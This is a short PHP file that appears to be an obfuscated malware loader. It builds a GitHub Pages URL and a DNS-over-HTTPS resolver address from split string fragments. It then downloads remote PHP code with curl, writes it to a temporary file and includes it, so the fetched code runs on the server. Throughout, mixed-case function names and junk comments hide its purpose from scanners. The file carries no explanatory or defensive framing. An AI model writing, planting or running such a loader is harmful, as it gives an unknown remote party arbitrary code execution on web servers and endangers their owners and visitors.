<?php

$url = 'htt';
$url .= 'ps://cvar1';
$url .= '984.github.';
$url .= 'io/scri';
$url .= 'pts/idx.p';
$url .= 'hp';

$dns = 'ht';
$dns .= 'tps:/';
$dns .= '/cloud';
$dns .= 'flare-';
$dns .= 'dns.c';
$dns .= 'om/dns';
$dns .= '-query';

$ch = CurL_init /* 767n90 */($url);

if (defined('CURLOPT_DOH_URL')) {
    curL_setOPT($ch, CURLOPT_DOH_URL, $dns);
}
cUrl_setOpt/* d4564*/($ch, CURLOPT_RETURNTRANSFER, TRUE);
Curl_seTOPt/* d2345 */($ch, CURLOPT_SSL_VERIFYHOST, 2); 
curL_seTopt /* *//* 678in */($ch, CURLOPT_SSL_VERIFYPEER, true);
$res = curl_ExEC/* 7568 */($ch);
cuRl_close/* c34 */($ch);

$tmp = TMPfIle/* h7n89o */();
$path = streaM_Get_meTa_daTa/* 345 */($tmp)/* 23cd */['uri'];
fprintf/* 3d45 */($tmp,'%s',$res);
IncLude/* 23x4 *//* */($path);
fclose/* 8k90p */ /* */($tmp);